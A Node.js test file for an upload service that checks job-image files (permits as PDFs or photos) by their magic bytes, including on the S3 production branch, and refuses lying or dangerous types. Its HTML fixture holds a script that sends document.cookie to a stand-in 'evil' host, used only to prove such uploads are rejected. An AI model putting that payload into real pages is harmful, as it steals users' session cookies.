/*
 * WHAT MAY BE STORED AS A JOB IMAGE — the check on the PRODUCTION path.
 *
 * ─── WHY THIS FILE EXISTS, AND WHY GREPPING FOUND THE WRONG ANSWER ─────────
 *
 * utils/file-storage.js has a well-formed ALLOWED_MIME list. It is reached only
 * through writeBuffer(), which services/job-image.service.js calls on the
 * LOCAL-DISK branch. Every deployed environment has S3_BUCKET_NAME set, so that
 * branch never runs there: the client-declared mimetype went straight onto the
 * S3 object's Content-Type and came back out of a presigned URL. An executable,
 * or a text/html document served from the bucket's origin, was storable.
 *
 * So the interesting assertion is not "the allowlist exists" — it did, and it
 * was correct, and it was unreachable. It is:
 *   · the check runs on the S3 branch (test: "the S3 branch is covered too"),
 *   · the Content-Type written to the object is the SNIFFED type and never the
 *     declared one, so a lying header cannot survive the round trip,
 *   · and nothing reaches storage or the INSERT when the file is refused.
 *
 * No network and no real DB: the pool is faked, S3 is forced off by clearing
 * S3_BUCKET_NAME before utils/s3-storage.js reads it at require time, and the
 * one test that needs the S3 branch swaps the two functions it calls.
 */
process.env.S3_BUCKET_NAME = '';          // BEFORE utils/s3-storage.js is loaded

const { test, beforeEach, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { installFakePool } = require('./helpers/fake-pool');

// The local-disk branch really writes; give it a temp root, not the repo.
const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'easyfix-job-image-'));
process.env.UPLOAD_JOB_FILES = tmpRoot;

const fake = installFakePool([
  [/SELECT COUNT\(\*\) AS existing FROM tbl_job_image/i, () => [{ existing: 0 }]],
  [/INSERT INTO tbl_job_image/i, () => ({ insertId: 991 })],
]);

const s3Storage = require('../utils/s3-storage');
const jobImage = require('../services/job-image.service');

/* ── Real leading bytes. Short, but every one is the actual signature. ── */
const PDF = Buffer.concat([Buffer.from('%PDF-1.7\n'), Buffer.from('1 0 obj\n<<>>\nendobj\n')]);
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]), Buffer.alloc(16)]);
const JPEG = Buffer.concat([Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), Buffer.from('\x00\x10JFIF\x00')]);
const GIF = Buffer.concat([Buffer.from('GIF89a'), Buffer.alloc(10)]);
const WEBP = Buffer.concat([Buffer.from('RIFF'), Buffer.from([0x20, 0, 0, 0]), Buffer.from('WEBPVP8 ')]);
const EXE = Buffer.concat([Buffer.from('MZ'), Buffer.from([0x90, 0x00, 0x03, 0x00]), Buffer.alloc(16)]);
const HTML = Buffer.from('<!DOCTYPE html><script>fetch("https://evil/"+document.cookie)</script>');
const ZIP = Buffer.concat([Buffer.from('PK'), Buffer.from([0x03, 0x04]), Buffer.alloc(16)]);

const file = (buffer, mimetype, originalname) => ({ buffer, mimetype, originalname });

const wrote = () => fake.calls.some((c) => /INSERT INTO tbl_job_image/i.test(c.sql));
const rejects = async (f, match) => {
  await assert.rejects(() => jobImage.uploadJobImage({ jobId: 5001, file: f, category: 'Permission' }),
    (e) => { assert.equal(e.status, 400, 'a refusal must be a 400, not a 500'); assert.match(e.message, match); return true; });
};

beforeEach(() => fake.reset());
after(() => { fake.restore(); fs.rmSync(tmpRoot, { recursive: true, force: true }); });

/* ─── 1. WHAT A PERMIT MAY BE ─────────────────────────────────────────── */

test('a PDF is accepted — two of the three real permit samples are PDFs', async () => {
  const out = await jobImage.uploadJobImage({
    jobId: 5001, file: file(PDF, 'application/pdf', 'gate-pass.pdf'), category: 'Permission',
  });
  assert.equal(out.mime_type, 'application/pdf');
  assert.equal(out.kind, 'pdf');
  assert.equal(out.image_category, 'permission');
  assert.ok(wrote(), 'an accepted file must reach the tbl_job_image INSERT');
});

test('a photographed paper permit is accepted — the third sample is a JPEG', async () => {
  const out = await jobImage.uploadJobImage({
    jobId: 5001, file: file(JPEG, 'image/jpeg', 'ppz-form.jpg'), category: 'Permission',
  });
  assert.equal(out.mime_type, 'image/jpeg');
  assert.equal(out.kind, 'image');
});

test('every type on the allowlist really passes the sniff', () => {
  const byType = {
    'application/pdf': PDF, 'image/png': PNG, 'image/jpeg': JPEG, 'image/gif': GIF, 'image/webp': WEBP,
  };
  for (const mime of jobImage.ALLOWED_UPLOAD_MIME) {
    assert.ok(byType[mime], `the allowlist advertises ${mime} but this test has no sample for it`);
    assert.equal(jobImage.sniffMime(byType[mime]), mime,
      `${mime} is advertised as accepted but its own magic number does not match — `
      + 'an allowlist entry with no working signature can never be uploaded');
  }
});

/* ─── 2. WHAT MUST NOT BE STORED ──────────────────────────────────────── */

test('an executable is rejected even when it declares itself a PDF', async () => {
  await rejects(file(EXE, 'application/pdf', 'permit.pdf'), /unsupported file type/i);
  assert.equal(wrote(), false, 'the refusal must come BEFORE the row is written');
});

test('an HTML document is rejected — it would execute on the bucket origin', async () => {
  await rejects(file(HTML, 'text/html', 'permit.html'), /unsupported file type/i);
  assert.equal(wrote(), false);
});

test('an archive is rejected — 63k legacy .zip rows came from the old CRM, not this path', async () => {
  await rejects(file(ZIP, 'application/zip', 'permits.zip'), /unsupported file type/i);
});

test('a declared type that disagrees with the bytes is rejected', async () => {
  // Both halves are on the allowlist; it is the DISAGREEMENT that is refused,
  // because one of the two is lying and we cannot tell which.
  await rejects(file(PNG, 'application/pdf', 'gate-pass.pdf'), /does not match the file contents/i);
  assert.equal(wrote(), false);
});

test('an empty upload is still the old 400, not a crash in the sniff', async () => {
  await assert.rejects(
    () => jobImage.uploadJobImage({ jobId: 5001, file: null, category: 'Permission' }),
    (e) => e.status === 400 && /missing "file" upload/.test(e.message));
});

/* ─── 3. THE BROWSER CASE THE OLD LIST CALLED OUT ─────────────────────── */

test('application/octet-stream is resolved by the bytes, not refused', async () => {
  // utils/file-storage.js allows octet-stream with the note "browsers sometimes
  // send this for .pdf". Sniffing makes that permissiveness safe instead of a
  // hole: the declaration is ignored and the bytes decide.
  const out = await jobImage.uploadJobImage({
    jobId: 5001, file: file(PDF, 'application/octet-stream', 'gate-pass.pdf'), category: 'Permission',
  });
  assert.equal(out.mime_type, 'application/pdf');
});

test('octet-stream does NOT launder a file that is not on the list', async () => {
  await rejects(file(EXE, 'application/octet-stream', 'thing.pdf'), /unsupported file type/i);
});

test('created_date is bound as a Date, never SQL NOW()', async () => {
  fake.reset();
  await jobImage.uploadJobImage({ jobId: 5001, file: file(PNG, 'image/png', 'gate-pass.png'), category: 'Permission' });
  const ins = fake.calls.find((c) => /INSERT INTO tbl_job_image/i.test(c.sql));
  assert.ok(ins, 'the INSERT must have run');
  assert.doesNotMatch(ins.sql, /NOW\(\)/);
  assert.match(ins.sql, /VALUES \(\?, \?, \?, \?, \?\)/);
  assert.ok(ins.params[4] instanceof Date, 'created_date is bound as a Date');
});

/* ─── 4. THE PRODUCTION BRANCH — the whole point of the file ──────────── */

test('the S3 branch is covered too, and stores the SNIFFED Content-Type', async () => {
  // With S3 configured — every deployed environment — writeBuffer/checkMime
  // never runs. This is the branch that had no check at all.
  const realEnabled = s3Storage.isEnabled;
  const realPut = s3Storage.putJobImage;
  const puts = [];
  s3Storage.isEnabled = () => true;
  s3Storage.putJobImage = async (args) => { puts.push(args); return 'JobSupportings/Permission_5001_1'; };
  try {
    await jobImage.uploadJobImage({
      jobId: 5001, file: file(PDF, 'application/octet-stream', 'gate-pass.pdf'), category: 'Permission',
    });
    assert.equal(puts.length, 1);
    assert.equal(puts[0].contentType, 'application/pdf',
      'the object Content-Type must be what the bytes say. Writing the client\'s '
      + 'declaration verbatim is how text/html ends up served from a presigned URL');

    // …and the refusal reaches this branch as well.
    fake.reset();
    puts.length = 0;
    await rejects(file(HTML, 'image/png', 'permit.png'), /unsupported file type/i);
    assert.equal(puts.length, 0, 'nothing may reach S3 once the file is refused');
    assert.equal(wrote(), false);
  } finally {
    s3Storage.isEnabled = realEnabled;
    s3Storage.putJobImage = realPut;
  }
});

/* ─── 5. READING THE TYPE BACK (the wire item's documentKind) ─────────── */

test('a stored value with an extension resolves exactly', async () => {
  for (const [stored, mime, kind] of [
    ['1757400000000_a1b2c3d4.pdf', 'application/pdf', 'pdf'],
    ['529042_checkin_20260823060219.jpg', 'image/jpeg', 'image'],
    ['shot.PNG', 'image/png', 'image'],
    ['scan.jfif', 'image/jpeg', 'image'],
  ]) {
    const t = await jobImage.resolveImageType(stored);
    assert.deepEqual(t, { mimeType: mime, kind }, `${stored} resolved wrongly`);
  }
});

test('an unrecognised legacy extension degrades to unknown, never to a guess', async () => {
  // These all exist in tbl_job_image today (.zip 126k rows, .mp4 12k, .heic 1.9k).
  for (const stored of ['bundle.zip', 'clip.mp4', 'photo.heic', 'half.crdownload', 'mail.eml']) {
    const t = await jobImage.resolveImageType(stored);
    assert.deepEqual(t, { mimeType: null, kind: 'unknown' },
      `${stored} must be unknown — reporting it as an image is worse than reporting nothing`);
  }
});

test('an extension-less S3 key with S3 off is unknown, not a crash', async () => {
  // S3 is disabled in this file, so the HeadObject path cannot run. It must
  // return the empty answer rather than throw into a caller's list.
  assert.deepEqual(await jobImage.resolveImageType('JobSupportings/Permission_5001_1'),
    { mimeType: null, kind: 'unknown' });
  assert.deepEqual(await jobImage.resolveImageType(null), { mimeType: null, kind: 'unknown' });
});
